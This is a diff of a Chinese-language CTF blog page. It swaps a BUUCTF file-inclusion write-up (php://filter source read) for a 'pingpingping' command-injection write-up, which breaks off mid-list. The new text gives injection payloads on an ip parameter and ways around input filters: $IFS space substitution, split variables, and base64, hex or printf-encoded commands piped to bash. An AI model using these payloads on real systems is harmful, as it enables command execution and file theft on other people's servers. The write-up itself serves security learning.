@@ -20,19 +20,19 @@
     var CONFIG = {"hostname":"wuzhangchi.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="拿到题目，发现有个tips 点击tips，出来一句话：Can you find out the flag? 根据本体的名字include以及url中的&#x2F;?file&#x3D;flag.php就能够知道这是一题文件包含题了。 用php伪协议读取flag.php的内容 php:&#x2F;&#x2F;filter 伪协议该伪协议读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 payload">
+  <meta name="description" content="#0×00 Ping PIng Ping一开始看到这个题目还不知道是啥意思，后来百度了一下ping是个啥： PING （Packet Internet Groper），因特网包探索器，用于测试网络连接量的程序 [1]  。Ping是工作在 TCP&#x2F;IP网络体系结构中应用层的一个服务命令， 主要是向特定的目的主机发送 ICMP（Internet Control Message Protocol 因特">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUUinclude1">
-<meta property="og:url" content="https://wuzhangchi.github.io/2021/03/25/BUUinclude1/index.html">
+<meta property="og:title" content="BUUpingpingping以及命令执行相关知识">
+<meta property="og:url" content="https://wuzhangchi.github.io/2021/04/01/BUUpingpingping%E4%BB%A5%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/index.html">
 <meta property="og:site_name" content="wzc">
-<meta property="og:description" content="拿到题目，发现有个tips 点击tips，出来一句话：Can you find out the flag? 根据本体的名字include以及url中的&#x2F;?file&#x3D;flag.php就能够知道这是一题文件包含题了。 用php伪协议读取flag.php的内容 php:&#x2F;&#x2F;filter 伪协议该伪协议读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 payload">
+<meta property="og:description" content="#0×00 Ping PIng Ping一开始看到这个题目还不知道是啥意思，后来百度了一下ping是个啥： PING （Packet Internet Groper），因特网包探索器，用于测试网络连接量的程序 [1]  。Ping是工作在 TCP&#x2F;IP网络体系结构中应用层的一个服务命令， 主要是向特定的目的主机发送 ICMP（Internet Control Message Protocol 因特">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-03-25T06:06:31.000Z">
-<meta property="article:modified_time" content="2021-03-25T06:40:20.983Z">
+<meta property="article:published_time" content="2021-04-01T13:48:39.000Z">
+<meta property="article:modified_time" content="2021-04-01T14:28:34.478Z">
 <meta property="article:author" content="Oops!">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://wuzhangchi.github.io/2021/03/25/BUUinclude1/">
+<link rel="canonical" href="https://wuzhangchi.github.io/2021/04/01/BUUpingpingping%E4%BB%A5%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">
 
 
 <script id="page-configurations">
@@ -45,7 +45,7 @@
   };
 </script>
 
-  <title>BUUinclude1 | wzc</title>
+  <title>BUUpingpingping以及命令执行相关知识 | wzc</title>
   
 
 
@@ -150,7 +150,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://wuzhangchi.github.io/2021/03/25/BUUinclude1/">
+    <link itemprop="mainEntityOfPage" href="https://wuzhangchi.github.io/2021/04/01/BUUpingpingping%E4%BB%A5%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -163,7 +163,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          BUUinclude1
+          BUUpingpingping以及命令执行相关知识
         </h1>
 
         <div class="post-meta">
@@ -174,7 +174,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-03-25 14:06:31 / Modified: 14:40:20" itemprop="dateCreated datePublished" datetime="2021-03-25T14:06:31+08:00">2021-03-25</time>
+              <time title="Created: 2021-04-01 21:48:39 / Modified: 22:28:34" itemprop="dateCreated datePublished" datetime="2021-04-01T21:48:39+08:00">2021-04-01</time>
             </span>
 
           
@@ -188,19 +188,28 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>拿到题目，发现有个tips</p>
-<p>点击tips，出来一句话：Can you find out the flag?</p>
-<p>根据本体的名字include以及url中的/?file=flag.php就能够知道这是一题文件包含题了。</p>
-<p>用php伪协议读取flag.php的内容</p>
-<p>php://filter 伪协议<br>该伪协议读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
-<p>payload为：file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<p>出来一段base64编码：</p>
-<p>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7YjQ4NzQzYmQtMDFhZi00ZTVkLWFiYTgtN2E0Yjc2NGEwMWE3fQo=</p>
-<p>解码之后得到：<br>&lt;?php<br>echo “Can you find out the flag?”;<br>//flag{b48743bd-01af-4e5d-aba8-7a4b764a01a7}</p>
-<p>成功得到flag</p>
-<p>最后补充一点php://filter伪协议的用法：</p>
-<p>1.php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</p>
-<p>2.php://input + [POST DATA]执行php代码</p>
+        <p>#0×00 Ping PIng Ping<br>一开始看到这个题目还不知道是啥意思，后来百度了一下ping是个啥：</p>
+<p>PING （Packet Internet Groper），因特网包探索器，用于测试网络连接量的程序 [1]  。Ping是工作在 TCP/IP网络体系结构中应用层的一个服务命令， 主要是向特定的目的主机发送 ICMP（Internet Control Message Protocol 因特网报文控制协议）Echo 请求报文，测试目的站是否可达及了解其有关状态。</p>
+<p>但是看了这个之后还是不知道要干啥，但是页面上有个  /?ip=  ，然后联想到之前做过的一个题，就输了一个/?ip=127.0.0.1,结果真的有回显。</p>
+<p>之后百度了一下别人的wp，了解到这题是一道命令执行，然后也大致了解了命令执行是个啥。</p>
+<p>先来说说这道题，既然这题是一道命令执行，那就来看看通过get方式能得到什么东西</p>
+<p>payload：/?ip=127.0.0.1|ls</p>
+<p>然后回显出flag.php和index.php</p>
+<p>这里试试能不能直接读到flag.php，payload：/?ip=127.0.0.1|cat flag.php</p>
+<p>居然出来个fuck your space，明显空格被过滤了</p>
+<p>去网上搜索了一下如何绕过空格，有如下几种：<br>&lt;&gt;</p>
+<p>%20(space)</p>
+<p>%09(tab)</p>
+<p>$IFS$9、 ${IFS}、$IFS<br>但是前三种都被过滤了，这里用第四种构造出payload：/?ip=127.0.01|cat$ifs$9flag.php</p>
+<p>但是这里我们并不能直接得到flag，因为回显显示出flag也被过滤了</p>
+<p>这里再试一试index.php，成功访问，得到被过滤的黑名单</p>
+<p>到这里之后，我们需要做的就是想办法绕过flag，得到flag.php</p>
+<p>这里有如下几种方式：<br>1.拼接绕过<br>a=fl;b=ag;$a$b<br>最后构造出的payload为：/?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php<br>为啥要把ag写在前面而把fl写在后面呢，就是吃了没有好好看代码的亏，如果你是先写了fl再写ag，实际上还是能和正则匹配匹配上的<br>其实还有更简单的：/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</p>
+<p>2.编码绕过（采用 | 来书写编码规则，可以是base64，hex和oct）<br>echo MTIzCg==|base64 -d 其将会打印123<br>echo “Y2F0IC9mbGFn”|base64-d|bash ==&gt;cat /flag</p>
+<p>echo “636174202f666c6167” | xxd -r -p|bash ==&gt;cat /flag</p>
+<p>$(printf “\154\163”) ==&gt;ls<br>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”) ==&gt;cat /flag<br>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0 ==&gt;cat /flag</p>
+<p>3.反斜杠和单双引号绕过：<br>ca’’t flag 或ca””t flag或ca\t fl\ag<br>但是这里单引号和双引号以及反斜杠都被过滤了</p>
+<p>4.</p>
 
     </div>
 
@@ -216,13 +225,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/03/20/BUUWarmUp1/" rel="prev" title="BUUWarmUp1">
-      <i class="fa fa-chevron-left"></i> BUUWarmUp1
+    <a href="/2021/03/26/BUU%E9%9A%8F%E4%BE%BF%E6%B3%A8/" rel="prev" title="BUU随便注">
+      <i class="fa fa-chevron-left"></i> BUU随便注
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/03/25/BUUSecretFile/" rel="next" title="BUUSecretFile">
-      BUUSecretFile <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
